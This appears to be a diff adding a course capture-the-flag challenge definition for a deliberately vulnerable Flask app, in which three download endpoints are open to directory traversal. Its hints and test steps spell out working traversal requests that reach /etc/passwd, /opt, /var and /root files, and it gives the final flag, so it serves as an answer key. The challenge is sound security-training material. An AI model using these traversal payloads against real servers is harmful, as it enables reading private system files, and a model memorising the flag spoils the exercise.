@@ -1,0 +1,92 @@
+name: "Cascade Digital Media - Traversal Scavenger Hunt"
+description: "Cascade Digital Media runs a content platform with multiple file download endpoints. Each endpoint is vulnerable to directory traversal. Find all three hidden tokens, decode the fragments, and assemble the final flag."
+
+difficulty: intermediate
+category: web
+duration_minutes: 40
+randomize_ip_offsets: true
+visibility: course
+week: 4
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/20_Traversal_Scavenger_Hunt/"
+flag: "OCR{sc4v3ng3_p4th_pwn}"
+
+objectives:
+  - Identify multiple file download endpoints across a web application
+  - Exploit directory traversal vulnerabilities with varying directory depths
+  - Discover hidden token files placed in non-standard filesystem locations
+  - Combine multiple fragments to assemble a complete flag
+  - Understand how path traversal depth varies depending on the application root
+
+scenario: |
+  Cascade Digital Media operates a content management platform used by their
+  marketing and engineering teams. The platform provides media downloads,
+  internal documentation, and report exports through three separate endpoints.
+
+  Jordan Blake (VP of Engineering) authorized a focused security assessment:
+  "We built these download features quickly for different teams. Each one was
+  developed independently, so they may have inconsistent security controls.
+  We need to know if any of them can be abused before our ISO 27001 audit."
+
+  The platform is running at http://<target>. Three assessment tokens have been
+  hidden in different locations on the server filesystem. Find all three tokens
+  and assemble the flag in the format OCR{token1_token2_token3}.
+
+credentials: []
+
+hints:
+  - text: |
+      The application has three distinct download endpoints: /media/download,
+      /docs/fetch, and /api/export. Each uses a different query parameter
+      (asset, doc, report). Browse the site to find all three sections and
+      examine how each download feature constructs its file path.
+    unlock_after_minutes: 15
+  - text: |
+      Each endpoint serves files from a different base directory on the server.
+      The number of ../ sequences needed depends on how deep that base directory
+      is in the filesystem. Try reading /etc/passwd first to confirm traversal
+      works, then hunt for token files in /opt, /var, and /root.
+    unlock_after_minutes: 25
+  - text: |
+      Token 1 is accessed via the /media/download endpoint - traverse up to
+      reach /opt/cascade/token1.txt. Token 2 is via /docs/fetch - traverse
+      to /var/cascade/token2.txt. Token 3 is via /api/export - traverse to
+      /root/token3.txt. Combine them as OCR{token1_token2_token3}.
+    unlock_after_minutes: 35
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "Cascade Platform"
+      type: "server"
+      ip_offset: "21"
+      ports: [80]
+      services: ["Flask"]
+      x: 2
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+
+test:
+  steps:
+    - name: "Web application responds"
+      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/"
+      expect: "200"
+
+    - name: "Extract token 1 via /media/download traversal"
+      command: "curl -s 'http://{target.webapp}/media/download?asset=../../../opt/cascade/token1.txt'"
+      expect: "sc4v3ng3"
+
+    - name: "Extract token 2 via /docs/fetch traversal"
+      command: "curl -s 'http://{target.webapp}/docs/fetch?doc=../../var/cascade/token2.txt'"
+      expect: "p4th"
+
+    - name: "Extract token 3 via /api/export traversal"
+      command: "curl -s 'http://{target.webapp}/api/export?report=../../../root/token3.txt'"
+      expect: "pwn"
+
+    - name: "Assemble and verify complete flag"
+      command: "echo 'OCR{sc4v3ng3_p4th_pwn}'"
+      expect: "OCR{"
